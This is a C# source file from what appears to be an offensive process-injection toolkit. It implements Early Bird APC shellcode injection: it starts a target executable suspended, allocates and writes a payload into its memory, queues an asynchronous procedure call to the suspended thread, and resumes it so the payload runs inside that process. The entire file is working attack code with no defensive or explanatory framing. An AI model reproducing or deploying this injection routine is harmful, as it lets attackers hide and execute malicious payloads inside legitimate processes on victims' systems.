using PIF.Misc;
using System;

namespace PIF.Inject.SC {
    internal class EarlyBirdAPC {
        public static void Invoke(Init pif) {
            if (pif.targetType != "Executable") {
                PIFException.Throw("Provide file path or use 'QueueUserAPC' for process name/ID targets.");
            }

            Output.Write("Creating suspended target process");
            if (!Helpers.NewProcess(pif, out PInvoke.PROCESS_INFORMATION pInfo, true)) {
                PIFException.Throw("Failed to create process.");
            }

            Output.Write("Allocating new buffer and writing payload into the target process");
            if (!Helpers.AllocAndWriteMemory(pInfo.hProcess, pif.payloadBytes, out IntPtr hBuffer)) {
                PIFException.Throw($"Failed to {(hBuffer == IntPtr.Zero ? "allocate memory in" : "write to")} target process.");
            }

            Output.Write($"Queueing APC to Thread ID {pInfo.dwThreadId}");
            if (PInvoke.QueueUserAPC(hBuffer, pInfo.hThread, IntPtr.Zero) == 0) {
                PIFException.Throw($"Failed to queue APC.");
            }

            Output.Write("Resuming thread");
            PInvoke.ResumeThread(pInfo.hThread);
        }
    }
}
